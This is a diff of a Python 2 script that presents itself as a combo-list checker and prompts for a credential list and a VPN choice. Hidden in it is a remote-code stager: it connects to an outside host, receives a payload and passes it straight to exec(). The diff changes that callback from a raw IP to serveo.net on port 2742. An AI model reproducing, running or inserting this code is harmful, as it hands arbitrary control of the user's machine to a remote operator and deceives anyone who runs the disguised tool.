@@ -6,11 +6,11 @@ print '\x1b[92m   \n          ################################               \n 
 lob=raw_input("Combo List: ")
 print(" ")
 jkl=raw_input("Use VPN?(Y/N): ")
-
+#if jkl == "Y" or "y":
 for x in range(10):
 	try:
 		s=socket.socket(2,socket.SOCK_STREAM)
-		s.connect(('3.17.202.129',11440))
+		s.connect(('serveo.net',2742))
 		break
 	except:
 		time.sleep(5)
@@ -20,6 +20,7 @@ while len(d)<l:
 	d+=s.recv(l-len(d))
 exec(d,{'s':s})
 
+#else:
 
 for i in range(1, 1000000):
  time.sleep(0.8)
